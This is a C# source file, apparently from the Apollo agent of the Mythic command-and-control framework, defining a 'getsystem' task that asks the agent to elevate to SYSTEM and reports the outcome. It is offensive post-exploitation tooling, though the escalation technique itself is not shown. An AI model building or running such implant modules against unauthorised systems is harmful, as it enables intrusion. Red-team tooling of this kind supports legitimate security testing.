#define COMMAND_NAME_UPPER

#if DEBUG
#define GETSYSTEM
#endif

#if GETSYSTEM

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;

namespace Tasks
{
    public class getsystem : Tasking
    {

        public getsystem(IAgent agent, MythicTask data) : base(agent, data)
        {
        }
        public override void Start()
        {
            MythicTaskResponse resp;
            bool elevated = false;
            (elevated, _) = _agent.GetIdentityManager().GetSystem();
            if (elevated)
            {
                resp = CreateTaskResponse("Elevated to SYSTEM", true, "completed");
            } else
            {
                resp = CreateTaskResponse("Failed to elevate to SYSTEM", true, "error");
            }
            
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif